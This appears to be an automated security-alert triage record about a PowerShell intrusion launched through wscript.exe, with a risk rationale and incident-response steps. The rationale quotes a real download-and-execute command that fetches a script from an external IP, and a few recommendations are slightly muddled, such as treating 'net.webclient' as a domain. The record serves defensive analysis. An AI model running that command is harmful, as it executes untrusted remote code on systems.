alert_summary: A PowerShell instance was launched via wscript.exe with an encoded command that downloaded and executed a script from the untrusted external IP 45.146.164.110, indicating a high‑severity intrusion attempt.

risk_assessment.rationale: The encoded PowerShell payload (IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')) demonstrates deliberate obfuscation and remote code execution from an unknown server, matching ATT&CK techniques T1059.001 (PowerShell) and T1027 (Obfuscation). Correlation data shows 55 related lateral‑movement events, suggesting the attacker may be attempting to spread across the network. The use of wscript.exe as a launch vector further evades typical detection, raising confidence that this is an active compromise requiring immediate containment.

recommended_actions: Review the parent-child process execution tree for the affected host
recommended_actions_freeform_experimenta: Isolate the endpoint (C:\Windows\System32\wscript.exe) immediately to stop any further lateral movement while preserving volatile memory for forensic capture.
Collect full disk images, RAM dumps, and all relevant Sysmon logs from the affected host and any adjacent hosts that show the same lateral‑movement correlation pattern (55 events).
Run a deep scan of the user profile directory (C:\Users\ke.li.yam) for additional malicious scripts or scheduled tasks that may have been dropped by the downloaded payload.
Block outbound traffic to 45.146.164.110 (and any other IPs in the same /24 range) at the firewall and update IDS/IPS signatures to detect similar PowerShell‑encoded command patterns.
Create a YARA rule targeting the specific Base64‑encoded PowerShell string (`SQBFAFgAIAAoAE4AZQB3...`) and the “IEX (New-Object Net.WebClient).DownloadString” pattern for future endpoint detection.
Check Active Directory for newly created or modified accounts, especially any that reference the ‘ke.li.yam’ user context, and enforce password resets where appropriate.
Review Group Policy Objects for any recent changes that could have enabled script execution (e.g., `AllowRemoteSigned` PowerShell policy) and revert to a hardened baseline.
Engage threat‑intel teams to see if the IP 45.146.164.110 or the domain net.webclient has been observed in other campaigns; consider adding it to blocklists across the organization.
After remediation, conduct a post‑incident review to update your detection rules (Sysmon Event ID 1/5) and ensure that future PowerShell executions via wscript.exe are flagged with higher severity.
triage_rationale_experimental: The encoded PowerShell command launched by wscript.exe downloads and executes code from an untrusted external IP, matches known ATT&CK techniques for PowerShell abuse and obfuscation, and is linked to a high‑volume lateral‑movement pattern, indicating a genuine compromise.
